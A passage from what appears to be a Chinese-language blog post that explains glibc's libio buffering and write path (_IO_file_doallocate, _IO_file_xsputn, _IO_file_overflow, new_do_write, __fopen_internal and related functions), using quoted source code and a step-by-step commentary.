<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_doallocbuf 位于 glibc/libio/genops.c。检测 _IO_UNBUFFERED 和 _mods 两个标志位，然后调用 _IO_DOALLOCATE，这也是一个宏定义，相当于调用了 _IO_file_doallocate。</span><br><span class="line"><span class="keyword">void</span> _IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br><span class="line"><span class="comment">//#define _IO_DOALLOCATE(FP) JUMP0 (__doallocate, FP)</span></span><br></pre></td></tr></table></figure>

<p>_IO_file_doallocate 位于 /glibc/libio/filedoalloc.c。过程大致为：</p>
<ul>
<li>通过调用 __stat 执行的函数，获取文件信息(st 结构体)，获取到 size(st.st_blksize)。</li>
<li>根据 size 申请一块内存</li>
<li>接着调用了 _IO_setb</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #define _IO_SYSSTAT(FP, BUF) JUMP1 (__stat, FP, BUF)</span></span><br><span class="line"><span class="keyword">int</span> _IO_file_doallocate (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t size;</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _LIBC</span></span><br><span class="line">    <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">    function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">    on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">    to get called by any program that does buffered I/O. */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">        (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    size = _IO_BUFSIZ;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">            DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            local_isatty (fp-&gt;_fileno))</span><br><span class="line">                fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">        <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">            size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    p = <span class="built_in">malloc</span> (size);</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    _IO_setb (fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_doallocate)</span><br></pre></td></tr></table></figure>

<h3 id="IO-setb"><a href="#IO-setb" class="headerlink" title="_IO_setb"></a>_IO_setb</h3><p>_IO_setb 就是重新申请缓冲区(当 IO_buf_base 存在)或设置 IO_buf_base 为指定位置，这个位置存储在 _shortbuf 中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_setb (_IO_FILE *f, <span class="keyword">char</span> *b, <span class="keyword">char</span> *eb, <span class="keyword">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">        <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">    f-&gt;_IO_buf_base = b;</span><br><span class="line">    f-&gt;_IO_buf_end = eb;</span><br><span class="line">    <span class="keyword">if</span> (a)</span><br><span class="line">        f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_setb)</span><br></pre></td></tr></table></figure>

<h2 id="IO-file-xsputn"><a href="#IO-file-xsputn" class="headerlink" title="_IO_file_xsputn"></a>_IO_file_xsputn</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t _IO_new_file_xsputn (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_size_t n)</span><br></pre></td></tr></table></figure>

<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><ul>
<li>f: 文件流指针</li>
<li>data: 缓冲区数据地址</li>
<li>n: 输出长度</li>
</ul>
<h3 id="流程-1"><a href="#流程-1" class="headerlink" title="流程"></a>流程</h3><ol>
<li>定义变量，输出长度若不满足要求则直接返回<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">_IO_size_t to_do = n;</span><br><span class="line"><span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">_IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
<li>然后检查 _flags 是否有 _IO_LINE_BUF 和 _IO_CURRENTLY_PUTTING。</li>
</ol>
<ul>
<li>满足，则先获取内容的长度(count)，接着若 count 大于等于待输出长度 n，则进入循环从数据中找出最后一个<code>\n</code>。并且设置 must_flush 为1。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">(or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">&#123;</span><br><span class="line">    count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">    <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">	    <span class="keyword">const</span> <span class="keyword">char</span> *p;</span><br><span class="line">	    <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	        <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count = p - s + <span class="number">1</span>;</span><br><span class="line">                must_flush = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>否，则当内容不为 0 时，仅获取内容的长度(count)。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>当数据长度大于 0 时，比较 count 与待输出长度。当 count 大于待输出长度时时，设置 count=to_do，然后再设置 _flags。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Then fill the buffer. */</span></span><br><span class="line"><span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">	    count = to_do;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _LIBC</span></span><br><span class="line">    f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">    f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    s += count;</span><br><span class="line">    to_do -= count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>根据最后获得的 to_go 与 must_flush 来进行最后的输出。主要调用的是 _IO_OVERFLOW 与 new_do_write 也就是 _IO_file_overflow 与 _IO_do_write 来输出至缓冲区，执行系统调用 write 来输出。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t block_size, do_write;</span><br><span class="line">    <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	caller that everything has been written.  */</span></span><br><span class="line">	    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">    block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">    do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (do_write)</span><br><span class="line">	&#123;</span><br><span class="line">        count = new_do_write (f, s, do_write);</span><br><span class="line">        to_do -= count;</span><br><span class="line">        <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">            <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">    <span class="keyword">if</span> (to_do)</span><br><span class="line">	    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> n - to_do;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-file-overflow"><a href="#IO-file-overflow" class="headerlink" title="_IO_file_overflow"></a>_IO_file_overflow</h3><p>函数的定义位于 /libio/fileops.c。稍微比 fread 简单些，主要是对 _flags 的检查与修改。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> _IO_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br></pre></td></tr></table></figure>

<h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><ul>
<li>f: 文件流指针</li>
<li>ch: 输出长度</li>
</ul>
<h4 id="流程-2"><a href="#流程-2" class="headerlink" title="流程"></a>流程</h4><ol>
<li>首先检查 _flags，覆盖 _flags 时可能需要注意。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>检查 _IO_write_base 是否为空，为空则申请缓冲区并设置 _flags，_IO_doallocbuf 在上面提到过，作用就是申请缓冲区。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">        _IO_doallocbuf (f);</span><br><span class="line">        _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
<li>再检查 _IO_IN_BACKUP，并执行相关操作。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">    _IO_free_backup_area (f);</span><br><span class="line">    f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">    f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>最后再对 _flags 进行相关修改。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="2">
<li>操作完 _flags 后根据 _flags 的状态来进行输出，输出调用的是 _IO_do_write。<ul>
<li>输出长度为 EOF 时，直接输出所有内容。</li>
<li>_IO_write_ptr 等于 _IO_buf_end 时，也就是没有输出内容，则返回 EOF。</li>
<li>以上都不满足，则输出部分内容。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">*f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="IO-do-write"><a href="#IO-do-write" class="headerlink" title="_IO_do_write"></a>_IO_do_write</h3><p>主要调用的是 new_do_write，函数位于 /libio/fileops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> _IO_size_t <span class="title">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span></span></span><br></pre></td></tr></table></figure>

<h4 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h4><ul>
<li>fp: 文件流指针</li>
<li>data: 数据指针</li>
<li>to_do: 待输出长度</li>
</ul>
<h5 id="流程-3"><a href="#流程-3" class="headerlink" title="流程"></a>流程</h5><ol>
<li>声明变量，并检查 _flags 是否有 _IO_IS_APPENDING。</li>
</ol>
<ul>
<li>满足，则设置 _offset 为 _IO_pos_BAD<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t count;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line"><span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure></li>
<li>否，则再检查 _IO_read_end 与 _IO_write_base。<ul>
<li>两者不相等则执行 _IO_SYSSEEK，寻找文件偏移。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_offset = new_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<ol start="2">
<li>执行 _IO_SYSWRITE，也就是 _IO_new_file_write。然后根据返回值设置 _flags 后返回。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line"><span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-new-file-write"><a href="#IO-new-file-write" class="headerlink" title="_IO_new_file_write"></a>_IO_new_file_write</h3><p>主要是调用 write 进行输出，位于 /libio/fileops.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_ssize_t _IO_new_file_write (_IO_FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, _IO_ssize_t n)</span><br></pre></td></tr></table></figure>

<h4 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h4><ul>
<li>f： 文件流指针</li>
<li>data: 数据指针</li>
<li>n: 待输出长度</li>
</ul>
<h4 id="流程-4"><a href="#流程-4" class="headerlink" title="流程"></a>流程</h4><p>定义变量，并调用 write or write_not_cancel(由 _flags 决定) 来获取输出长度(count)，直到 count 为0。最后返回。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_ssize_t to_do = n;</span><br><span class="line"><span class="keyword">while</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_ssize_t count = (__builtin_expect (f-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>) ? write_not_cancel (f-&gt;_fileno, data, to_do) : write (f-&gt;_fileno, data, to_do));</span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    to_do -= count;</span><br><span class="line">    data = (<span class="keyword">void</span> *) ((<span class="keyword">char</span> *) data + count);</span><br><span class="line">&#125;</span><br><span class="line">n -= to_do;</span><br><span class="line"><span class="keyword">if</span> (f-&gt;_offset &gt;= <span class="number">0</span>)</span><br><span class="line">    f-&gt;_offset += n;</span><br><span class="line"><span class="keyword">return</span> n;</span><br></pre></td></tr></table></figure>

<h2 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * __fopen_internal (<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode, <span class="keyword">int</span> is32)</span><br></pre></td></tr></table></figure>

<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><ul>
<li>filename: 文件名</li>
<li>mode: 打开方式</li>
<li>is32: 是否是 32 位</li>
</ul>
<h3 id="流程-5"><a href="#流程-5" class="headerlink" title="流程"></a>流程</h3><ol>
<li>申请一个堆空间用来存放 _IO_FILE_plus 与一些其他内容，一起作为结构体 locked_FILE。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">&#125; *new_f = (struct locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (struct locked_FILE));</span><br></pre></td></tr></table></figure></li>
<li>检查是否申请成功，然后设置一些 _flags。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li>接着调用 _IO_no_init 进行初始化。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">_IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">_IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></li>
<li>之后继续设置 _IO_file_jumps，并调用 _IO_file_init 对 _IO_list_all 进行初始化。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">_IO_file_init (&amp;new_f-&gt;fp);</span><br></pre></td></tr></table></figure></li>
<li>最后调用 _IO_file_fopen，这才打开文件。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span>!_IO_UNIFIED_JUMPTABLES</span></span><br><span class="line">new_f-&gt;fp.vtable = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure></li>
<li>最后调用 _IO_un_link。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="built_in">free</span> (new_f);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h3><p>位于 /libio/genops.c。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> _IO_no_init (_IO_FILE *fp, <span class="keyword">int</span> flags, <span class="keyword">int</span> orientation, struct _IO_wide_data *wd, <span class="keyword">const</span> struct _IO_jump_t *jmp)</span><br></pre></td></tr></table></figure>

<h4 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h4><ul>
<li>fp: 文件流指针</li>
<li>flags: _flags</li>
<li>orientation: _mode</li>
<li>wd: 数据对应的地址</li>
<li>jmp: vtable</li>
</ul>
<h4 id="流程-6"><a href="#流程-6" class="headerlink" title="流程"></a>流程</h4><ol>
<li>首先调用 _IO_old_init，对 _flags 进行初始化。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_old_init (fp, flags);</span><br></pre></td></tr></table></figure></li>
<li>再对 _mode、_wide_data、_freeres_list 进行初始化<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_mode = orientation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line"><span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    fp-&gt;_wide_data = wd;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">    stream. */</span></span><br><span class="line">    fp-&gt;_wide_data = (struct _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></li>
